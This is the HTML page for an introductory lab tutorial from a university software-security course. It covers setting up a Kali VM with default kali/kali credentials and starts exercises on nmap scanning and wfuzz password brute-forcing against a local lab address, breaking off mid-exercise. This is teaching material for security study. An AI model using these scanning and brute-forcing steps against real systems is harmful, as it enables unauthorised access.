
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Tutorial 0: Initiation &#8212; Exercises 2022 documentation</title>
    <link rel="stylesheet" href="../_static/bootstrap-sphinx.css" type="text/css" />
    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../_static/css/my-style.css" type="text/css" />
    <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
    <script type="text/javascript" src="../_static/jquery.js"></script>
    <script type="text/javascript" src="../_static/underscore.js"></script>
    <script type="text/javascript" src="../_static/doctools.js"></script>
    <script type="text/javascript" src="../_static/language_data.js"></script>
    <link rel="shortcut icon" href="../_static/favicon.ico"/>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Tutorial 1: Race conditions" href="../tp1/tp.html" />
    <link rel="prev" title="Welcome to Tutorial’s part!" href="../index.html" />

<meta charset='utf-8'>
<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'>
<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1'>
<meta name="apple-mobile-web-app-capable" content="yes">
<script type="text/javascript" src="../_static/js/jquery-1.12.4.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/bootstrap-3.4.1/js/bootstrap.min.js "></script>
<script type="text/javascript" src="../_static/bootstrap-sphinx.js "></script>

<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script>
<script type="text/javascript" src="../_static/js/jquery-1.11.0.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/script.js"></script>





  </head><body>

  <div id="navbar" class="navbar navbar-inverse navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".nav-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="../index.html"><span><img src="../_static/UCLouvain_Logo+moodle.png"></span>
          LINGI2144</a>
        <span class="navbar-text navbar-version pull-left"><b>2022</b></span>
      </div>

        <div class="collapse navbar-collapse nav-collapse">
          <ul class="nav navbar-nav">
            
                <li><a href="/index.html">Main</a></li>
                <li><a href="/theory/index.html">Theory</a></li>
                <li><a href="/qcm/index.html">MCQ</a></li>
            
            
              <li class="dropdown globaltoc-container">
  <a role="button"
     id="dLabelGlobalToc"
     data-toggle="dropdown"
     data-target="#"
     href="../index.html">Section <b class="caret"></b></a>
  <ul class="dropdown-menu globaltoc"
      role="menu"
      aria-labelledby="dLabelGlobalToc"><ul class="current">
<li class="toctree-l1 current"><a class="current reference internal" href="#">Tutorial 0: Initiation</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="#bonus-going-beyond">Bonus: going beyond</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../tp1/tp.html">Tutorial 1: Race conditions</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../tp1/tp.html#prerequisite">Prerequisite</a></li>
<li class="toctree-l2"><a class="reference internal" href="../tp1/tp.html#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../tp1/tp.html#nfs-share-exploit-metasploit">NFS Share exploit - Metasploit</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../tp2/tp.html">Tutorial 2: Memory Safety</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp3/tp.html">Tutorial 3: Debugging with <code class="docutils literal notranslate"><span class="pre">GDB</span></code></a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp4/tp.html">Tutorial 4: Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp5/tp.html">Tutorial 5: Buffer Overflows and Shellcodes</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp6/tp.html">Tutorial 6: Protection</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp7/tp.html">Tutorial 7: Format String</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp8/tp.html">Tutorial 8: YARA</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp9/tp.html">Tutorial 9: Dynamic Analysis</a></li>
</ul>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../extra/extra.html">Setting up the lab environment</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/extra.html#download-a-vm-manager">Download a VM manager</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/extra.html#grab-your-kali-linux-image">Grab your Kali Linux Image</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/extra.html#bonus-make-yourself-at-home">Bonus : Make yourself at home !</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/gdb.html">Tutorial: Complement on GDB</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/gdb.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/gdb.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/handmadeshellcode.html">Tutorial:  Handmade Shellcode</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/handmadeshellcode.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/handmadeshellcode.html#from-c-to-shellcode">From C to shellcode</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/handmadeshellcode.html#removing-null-bytes">Removing Null bytes</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/stackstethoscope.html">Tutorial:  ByPassing ASLR - Stack Stethoscope</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/stackstethoscope.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/stackstethoscope.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/nfsshare2.html">Tutorial:  NFS Share exploit - Shellcode</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/nfsshare2.html#prerequisite">Prerequisite</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/nfsshare2.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/heapoverflow.html">Tutorial:  Heap overflow exploit - Function pointers</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/heapoverflow2.html">Tutorial:  Heap overflow exploit - Abusing the file system</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow2.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow2.html#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow2.html#gaining-root-access">Gaining root access</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow2.html#bonus">BONUS</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/en-var.html">Tutorial: Exploit using the Environment</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/en-var.html#requirements">Requirements</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/en-var.html#adding-environment-variable">Adding environment variable</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/en-var.html#go-even-further">Go even further</a></li>
</ul>
</li>
</ul>
</ul>
</li>
              
            
            
            
            
            
          </ul>

          
            
<form class="navbar-form navbar-right" action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form>
          
        </div>
    </div>
  </div>

<div class="container" >
  <div class="row">
      <div class="col-md-3">
        <div id="sidebar" class="bs-sidenav" role="complementary">
<form action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form><ul>
<li><a class="reference internal" href="#">Tutorial 0: Initiation</a><ul>
<li><a class="reference internal" href="#exercise">Exercise</a><ul>
<li><a class="reference internal" href="#finding-services-nmap">Finding services - <code class="docutils literal notranslate"><span class="pre">nmap</span></code></a></li>
<li><a class="reference internal" href="#bruteforcing-wfuzz">Bruteforcing - <code class="docutils literal notranslate"><span class="pre">wfuzz</span></code></a></li>
<li><a class="reference internal" href="#sql-injection-sqlmap">SQL Injection - <code class="docutils literal notranslate"><span class="pre">SQLMap</span></code></a></li>
<li><a class="reference internal" href="#command-injection-metasploit">Command Injection - <code class="docutils literal notranslate"><span class="pre">Metasploit</span></code></a></li>
</ul>
</li>
<li><a class="reference internal" href="#bonus-going-beyond">Bonus: going beyond</a></li>
</ul>
</li>
</ul>
<div class="row autorization" style="padding-top: 20px">
    <div class="col-xs-4 col-md-6">
        <form id="pdf_tp" target="_blank" style="text-align:center;" method="get" action="">
            <button style="text-align:center; border-radius:12px;" type="submit" class="up">
                <svg id="Capa_1"
                     width="50px" height="50px"
                     enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><g><g><path d="m393.5 151.547v263.953c0 22.091-17.909 40-40 40h-275c-22.091 0-40-17.909-40-40v-368c0-22.091 17.909-40 40-40h171.197c7.968 0 15.608 3.17 21.236 8.809l113.803 114.047c5.612 5.625 8.764 13.246 8.764 21.191z" fill="#f9f8f9"/><path d="m393.5 151.55v17.59h-104.32c-31.45 0-57.04-25.62-57.04-57.1v-104.54h17.56c7.96 0 15.6 3.17 21.23 8.81l113.81 114.05c5.61 5.62 8.76 13.24 8.76 21.19z" fill="#e3e0e4"/><path d="m108.5 455.5h-30c-22.09 0-40-17.91-40-40v-368c0-22.09 17.91-40 40-40h30c-22.09 0-40 17.91-40 40v368c0 22.09 17.91 40 40 40z" fill="#e3e0e4"/><g fill="#a29aa5"><path d="m219.608 157.5h-123.7c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h123.7c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m219.608 337.5h-123.7c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h123.7c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m317.908 217.5h-224c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h224c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m317.908 277.5h-224c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h224c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m390.81 139.14h-101.63c-14.93 0-27.04-12.14-27.04-27.1v-101.82c3.24 1.46 6.23 3.52 8.79 6.09l113.81 114.05c2.55 2.56 4.61 5.54 6.07 8.78z"/></g><ellipse cx="371.989" cy="403" fill="#80e29e" rx="101.511" ry="101.5"/><path d="m453.07 464.07c-18.52 24.56-47.95 40.43-81.08 40.43-56.06 0-101.51-45.44-101.51-101.5 0-33.13 15.87-62.55 40.43-81.07-12.83 16.99-20.43 38.14-20.43 61.07 0 56.06 45.45 101.5 101.51 101.5 22.93 0 44.08-7.6 61.08-20.43z" fill="#77d192"/><path d="m423.124 410.243c-4.008-7.25-13.135-9.881-20.386-5.873l-15.747 8.701v-45.572c0-8.284-6.717-15-15.002-15s-15.002 6.716-15.002 15v45.573l-15.747-8.701c-7.252-4.007-16.378-1.377-20.386 5.873-4.007 7.251-1.377 16.377 5.875 20.384l38.004 21c.091.05.184.093.275.141.139.073.278.146.419.214.167.082.336.158.505.232.125.055.25.111.377.163.198.081.398.156.598.228.099.036.197.073.297.107.24.081.481.153.723.222.064.018.127.038.191.055.287.077.576.144.865.204.023.005.046.011.069.015.971.194 1.95.294 2.924.294l-.001-.003h.015c2.497 0 4.997-.623 7.256-1.872l38.004-21c7.251-4.008 9.881-13.134 5.874-20.385z" fill="#f9f8f9"/></g><g><path d="m38.5 129.5c4.143 0 7.5-3.358 7.5-7.5v-74.5c0-17.92 14.581-32.5 32.504-32.5h171.215c1.687 0 3.339.203 4.946.562v96.474c0 19.08 15.497 34.603 34.546 34.603h96.274c.354 1.595.553 3.235.553 4.908v40.453c0 4.142 3.357 7.5 7.5 7.5s7.5-3.358 7.5-7.5v-40.453c0-10.002-3.892-19.409-10.957-26.488l-113.815-114.047c-7.087-7.101-16.515-11.012-26.547-11.012h-171.215c-26.193 0-47.504 21.309-47.504 47.5v74.5c0 4.142 3.357 7.5 7.5 7.5zm336.956 2.139h-86.245c-10.777 0-19.546-8.793-19.546-19.603v-86.404z"/><path d="m171 448h-92.496c-17.923 0-32.504-14.58-32.504-32.5v-258.5c0-4.142-3.357-7.5-7.5-7.5s-7.5 3.358-7.5 7.5v258.5c0 26.191 21.311 47.5 47.504 47.5h92.496c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5z"/><path d="m95.914 157.5h123.713c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5h-123.713c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5z"/><path d="m95.914 322.5c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h123.713c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5z"/><path d="m317.938 202.5h-224.025c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h224.024c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.499-7.5z"/><path d="m325.438 270c0-4.142-3.357-7.5-7.5-7.5h-224.025c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h224.024c4.143 0 7.501-3.358 7.501-7.5z"/><path d="m401.038 297.936v-70.936c0-4.142-3.357-7.5-7.5-7.5s-7.5 3.358-7.5 7.5v67.903c-4.6-.594-9.289-.903-14.049-.903-34.387 0-66.05 15.725-86.87 43.142-2.506 3.299-1.862 8.003 1.437 10.509 3.301 2.506 8.005 1.861 10.509-1.438 17.959-23.649 45.268-37.213 74.924-37.213 6.868 0 13.564.747 20.017 2.152.011.002.021.005.032.007 42.237 9.211 73.962 46.888 73.962 91.841 0 51.832-42.173 94-94.011 94s-94.011-42.168-94.011-94c0-9.542 1.423-18.95 4.229-27.965 1.231-3.955-.978-8.159-4.933-9.39-3.956-1.23-8.159.978-9.39 4.932-3.256 10.459-4.906 21.368-4.906 32.423 0 16.037 3.484 31.275 9.731 45h-66.709c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h75.028c19.528 29.501 53.008 49 90.961 49 60.109 0 109.011-48.897 109.011-109 0-50.048-33.911-92.319-79.962-105.064z"/><path d="m371.989 344.999c-12.407 0-22.502 10.093-22.502 22.5v32.859l-4.619-2.552c-10.857-6.001-24.574-2.048-30.578 8.81-2.907 5.26-3.591 11.338-1.927 17.113s5.479 10.556 10.739 13.463l38.003 21c6.646 3.71 15.127 3.734 21.767 0l38.004-21c5.261-2.907 9.075-7.688 10.739-13.463s.98-11.853-1.928-17.115c-6.003-10.857-19.721-14.81-30.577-8.808l-4.619 2.552v-32.859c0-12.407-10.095-22.5-22.502-22.5zm34.376 65.935c3.617-1.999 8.192-.682 10.194 2.937 2.023 3.489.632 8.315-2.938 10.192l-38.006 21.001c-2.328 1.295-5.291 1.189-7.563-.171l-37.696-20.83c-3.569-1.876-4.96-6.703-2.938-10.19 2.003-3.621 6.577-4.938 10.195-2.938l15.746 8.701c4.749 2.823 11.296-1.04 11.128-6.564v-45.573c0-4.136 3.365-7.5 7.502-7.5s7.502 3.364 7.502 7.5v45.572c-.17 5.534 6.367 9.39 11.127 6.564z"/></g></g>
                </svg>
                <br> <b> PDF </b>
            </button>
        </form>
    </div>
    <div class="col-xs-4 col-md-6">
        <form id="rar_tp"  target="_blank" style="text-align:center;" method="get" action="">
            <button style="text-align:center; border-radius:12px;" type="submit" class="up">
                <svg id="Capa_1"
                     width="50px" height="50px"
                     enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><g><g><path d="m453.31 460.125c0 24.508-19.907 44.375-44.464 44.375h-305.692c-24.557 0-44.464-19.867-44.464-44.375v-408.25c0-24.508 19.907-44.375 44.464-44.375h190.303c8.857 0 17.35 3.516 23.606 9.773l126.505 126.521c6.239 6.239 9.742 14.694 9.742 23.508z" fill="#f9f8f9"/><path d="m133.15 504.5h-30c-24.55 0-44.46-19.87-44.46-44.38v-408.24c0-24.51 19.91-44.38 44.46-44.38h30c-24.55 0-44.46 19.87-44.46 44.38v408.24c0 24.51 19.91 44.38 44.46 44.38z" fill="#e3e0e4"/><path d="m453.31 167.3v16.24h-115.96c-33.12 0-60.06-26.95-60.06-60.07v-115.97h16.17c8.85 0 17.35 3.52 23.6 9.77l126.51 126.52c6.24 6.24 9.74 14.7 9.74 23.51z" fill="#e3e0e4"/><path d="m450.32 153.54h-112.97c-16.6 0-30.06-13.46-30.06-30.07v-112.96c3.61 1.63 6.92 3.91 9.77 6.76l126.51 126.52c2.85 2.85 5.12 6.15 6.75 9.75z" fill="#b9a1d3"/><path d="m435 438.5h-358c-22.091 0-40-17.909-40-40v-146c0-22.091 17.909-40 40-40h358c22.091 0 40 17.909 40 40v146c0 22.091-17.909 40-40 40z" fill="#b9a1d3"/><path d="m102 438.5h-25c-22.09 0-40-17.91-40-40v-146c0-22.09 17.91-40 40-40h25c-22.09 0-40 17.91-40 40v146c0 22.09 17.91 40 40 40z" fill="#9573bb"/></g><g><path d="m58.689 153.851c4.143 0 7.5-3.357 7.5-7.5v-94.476c0-20.333 16.582-36.875 36.965-36.875h111.42c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-111.42c-28.653 0-51.965 23.271-51.965 51.875v94.476c0 4.142 3.358 7.5 7.5 7.5z"/><path d="m460.811 212.656v-45.354c0-10.879-4.24-21.111-11.938-28.811l-126.506-126.52c-7.718-7.72-17.985-11.971-28.91-11.971h-43.394c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h43.394c2.165 0 4.288.264 6.334.775v107.696c0 20.714 16.85 37.566 37.561 37.566h107.694c.505 2.025.765 4.125.765 6.265v38.954c-3.476-.812-7.092-1.256-10.811-1.256h-23.319c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h23.319c17.921 0 32.5 14.579 32.5 32.5v146c0 17.921-14.579 32.5-32.5 32.5h-268.66c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h268.66c3.719 0 7.335-.444 10.811-1.256v15.381c0 20.333-16.582 36.875-36.965 36.875h-305.692c-20.383 0-36.965-16.542-36.965-36.875v-15.381c3.476.812 7.092 1.256 10.811 1.256h53.319c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-53.319c-17.921 0-32.5-14.579-32.5-32.5v-146c0-17.921 14.579-32.5 32.5-32.5h299.702c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-299.702c-3.719 0-7.335.444-10.811 1.256v-24.905c0-4.143-3.357-7.5-7.5-7.5s-7.5 3.357-7.5 7.5v31.305c-13.04 8.477-21.689 23.165-21.689 39.844v146c0 16.679 8.649 31.367 21.689 39.844v21.781c0 28.604 23.312 51.875 51.965 51.875h305.691c28.653 0 51.965-23.271 51.965-51.875v-21.781c13.041-8.477 21.689-23.165 21.689-39.844v-146c.001-16.679-8.648-31.367-21.688-39.844zm-146.02-89.185v-97.863l120.414 120.429h-97.854c-12.439 0-22.56-10.123-22.56-22.566z"/><path d="m265.669 264.091c-1.584-3.853-5.297-6.341-9.462-6.341-.003 0-.006 0-.009 0-4.168.004-7.882 2.499-9.461 6.356-.023.057-.046.114-.067.172l-45.247 118.803c-1.475 3.87.469 8.203 4.34 9.678 3.865 1.475 8.203-.468 9.678-4.34l9.429-24.757h62.347l9.335 24.736c1.458 3.914 5.891 5.823 9.665 4.368 3.875-1.462 5.831-5.789 4.368-9.665l-44.836-118.808c-.025-.067-.053-.135-.08-.202zm-35.087 84.571 25.603-67.226 25.37 67.226z"/><path d="m181.648 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.588-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/><path d="m410.5 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.589-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/></g></g>
                </svg>
                <br> <b> Files </b>
            </button>
        </form>
    </div>
    <div class="col-xs-4 col-md-12">
        <form id="vid_tp" style="text-align:center;">
	<a id="notUp"  href="#!" style="text-align:center;"
   data-title="Watch now on youtube">
            <button class="video-btn up" onclick="topFunction()"
                    style="text-align:center; border-radius:12px;" data-toggle="modal" type="button"
                    data-target="#myModal"
                    data-src="">
                <?xml version="1.0" encoding="iso-8859-1"?>
<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg width="50px" height="50px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 512.003 512.003" style="enable-background:new 0 0 512.003 512.003;" xml:space="preserve">
<path style="fill:#E53935;" d="M443.734,80.336L330.86,70.437c-49.812-4.334-99.906-4.334-149.717,0L68.268,80.336
	c-38.702,3.124-68.459,35.541-68.267,74.368v202.667c-0.204,38.835,29.557,71.265,68.267,74.389l112.939,9.813
	c24.832,2.133,49.835,3.243,74.859,3.243c25.024,0,50.027-1.067,74.859-3.243l112.939-9.813c38.659-3.187,68.348-35.6,68.139-74.389
	V154.704C512.194,115.877,482.436,83.459,443.734,80.336z"/>
<path style="fill:#FAFAFA;" d="M357.782,247.077l-149.333-96c-4.951-3.193-11.552-1.768-14.745,3.183
	c-1.111,1.722-1.702,3.728-1.703,5.777v192c0.002,5.891,4.78,10.665,10.671,10.663c2.049-0.001,4.055-0.592,5.777-1.703l149.333-96
	c4.954-3.187,6.387-9.787,3.2-14.742c-0.825-1.283-1.917-2.374-3.2-3.2V247.077z"/>
<path d="M256.001,444.816c-25.003,0-50.005-1.088-74.837-3.243l-112.896-9.835c-38.71-3.124-68.471-35.554-68.267-74.389V154.683
	c-0.182-38.819,29.573-71.224,68.267-74.347l112.896-9.899c49.797-4.334,99.877-4.334,149.675,0l112.96,9.813
	c38.717,3.158,68.454,35.629,68.203,74.475v202.667c0.204,38.835-29.557,71.265-68.267,74.389l0,0l-112.96,9.813
	C306.028,443.771,281.004,444.816,256.001,444.816z M256.001,88.549c-24.405,0-48.768,1.067-72.981,3.157L69.953,101.52
	c-27.614,2.317-48.794,25.495-48.619,53.205v202.667c-0.116,27.7,21.097,50.827,48.704,53.099l112.96,9.813
	c48.57,4.209,97.414,4.209,145.984,0l113.067-9.813c27.589-2.315,48.76-25.456,48.619-53.141V154.683
	c0.116-27.7-21.097-50.827-48.704-53.099l-112.96-9.813c-24.235-2.105-48.569-3.164-73.003-3.179V88.549z"/>
<path d="M202.668,362.704c-5.891,0-10.667-4.776-10.667-10.667v-192c-0.01-5.891,4.758-10.674,10.649-10.684
	c2.057-0.003,4.07,0.588,5.799,1.703l149.333,96c4.96,3.178,6.405,9.776,3.227,14.736c-0.83,1.296-1.931,2.397-3.227,3.227
	l-149.333,96C206.724,362.124,204.717,362.709,202.668,362.704z M213.334,179.579v152.917l118.933-76.459L213.334,179.579z"/>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>

                <br> <b>  Video </b>
            </button>
        </a>
</form>

  <!-- Modal -->
  <!-- Modal -->
  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
    aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">

        <div class="modal-body">

          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
          <!-- 16:9 aspect ratio -->
          <div id="video-view" class="embed-responsive embed-responsive-16by9">

          </div>
        </div>
      </div>
    </div>
  </div>
    </div>
</div>
        </div>
      </div>
    <div class="body col-md-9 content" role="main" >
      
  <div class="section" id="tutorial-0-initiation">
<h1>Tutorial 0: Initiation<a class="headerlink" href="#tutorial-0-initiation" title="Permalink to this headline">¶</a></h1>
<?php
      $json   = "../../_static/config.json";
      $string = file_get_contents($json);
      if ($string === false) {
         //deal error
         echo "error json";
      }
      $decoded = json_decode($string, true);
      if ($decoded === null) {
         echo "error json decoded";
      }
      $visi = (strcmp($decoded["t0"],"1") === 0);
      $good = (strcmp($decoded["t0s"],"1") === 0);

      if($visi) {
         header("location: index.php");
         echo '<script type="text/javascript">',
                  'hideFiles();',
               '</script>';
         echo "<br><h3 style='text-align: center;'> Still not authorized by the professor  :/ </h3>";
         exit; // prevent further execution
      }
?>
<?php
      if($good) {
         //nothing
         echo '<script type="text/javascript">',
                  'hideSolution();',
               '</script>';
      } else {
         echo '<script type="text/javascript">',
                  //'$(document).ready(function() { $(".sol-img").toggle(); });',
               '</script>';
      }
?><p>Download and install VirtualBox 6.1</p>
<p class="centered">
<strong><a class="reference external" href="https://www.virtualbox.org/">https://www.virtualbox.org/</a></strong></p><p>Once Virtualbox is installed, download the VirtualBox Expansion Pack
from this <a class="reference external" href="https://download.virtualbox.org/virtualbox/6.1.18/Oracle_VM_VirtualBox_Extension_Pack-6.1.18.vbox-extpack">address</a>.</p>
<p>Download the Kali VM from this link</p>
<p class="centered">
<strong><a class="reference external" href="https://transvol.sgsi.ucl.ac.be/download.php?id=e51df06f753b8f84">https://transvol.sgsi.ucl.ac.be/download.php?id=e51df06f753b8f84</a></strong></p><div class="line-block">
<div class="line">Once downloaded, click on it VirtualBox will open, just click on the
“Import” button</div>
</div>
<div class="line-block">
<div class="line">Connection:</div>
</div>
<table border="1" class="docutils">
<colgroup>
<col width="50%" />
<col width="50%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head"><strong>username</strong></th>
<th class="head"><strong>password</strong></th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>kali</td>
<td>kali</td>
</tr>
</tbody>
</table>
<div class="section" id="exercise">
<h2>Exercise<a class="headerlink" href="#exercise" title="Permalink to this headline">¶</a></h2>
<div class="section" id="finding-services-nmap">
<h3>Finding services - <code class="docutils literal notranslate"><span class="pre">nmap</span></code><a class="headerlink" href="#finding-services-nmap" title="Permalink to this headline">¶</a></h3>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">nmap</span> <span class="pre">&lt;option&gt;</span> <span class="pre">&lt;IP&gt;</span></code></strong></p><div class="collapse tp1_s0" id="tp1_0_1"><a class="sol-img reference internal image-reference" href="../_images/0.PNG"><img alt="../_images/0.PNG" class="sol-img align-center" src="../_images/0.PNG" style="width: 380.79999999999995px; height: 110.6px;" /></a>
</div><?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  //'getSolution("../_images/0.PNG","finding-services-nmap");',
                  'updateSol("tp1_0_1","#tp1_0_1","finding-services-nmap");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="bruteforcing-wfuzz">
<h3>Bruteforcing - <code class="docutils literal notranslate"><span class="pre">wfuzz</span></code><a class="headerlink" href="#bruteforcing-wfuzz" title="Permalink to this headline">¶</a></h3>
<div class="line-block">
<div class="line">For URL such that:
<a class="reference external" href="http://172.17.0.2/gallery.php">http://172.17.0.2/gallery.php</a>?password=THE_PASS_YOU_TRIED&amp;Login=Login#</div>
<div class="line">You could then see that the “password” argument is the password you
entered, change that parameter and test again</div>
</div>
<p class="centered">
